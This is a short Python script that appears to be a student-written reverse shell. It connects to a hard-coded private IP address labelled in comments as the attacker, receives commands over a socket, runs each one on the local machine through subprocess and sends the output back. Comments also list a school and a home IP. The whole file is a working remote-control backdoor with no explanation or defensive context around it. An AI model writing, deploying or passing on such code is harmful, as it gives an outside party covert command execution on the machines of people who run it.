# Modules
import sys
import socket
import subprocess
import os

# SCHOOL IP: 192.168.210.158
# HOME IP: 192.168.0.228

#varviables
IP = "192.168.61.133"
PORT = 8080
BUFFER_SIZE = 1024

# Connect to the attacker
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((IP, PORT))

#Getting command, and sending it to the attacker
while True:
  command = s.recv(BUFFER_SIZE).decode()
  output = subprocess.getoutput(command)
  if command.lower() == "exit":
    print("[!] Exited...")
    sys.exit()
  elif (output == "") or (output == "\n"):
    s.send("Nothing to output...".encode())
  else:
    s.send(output.encode())

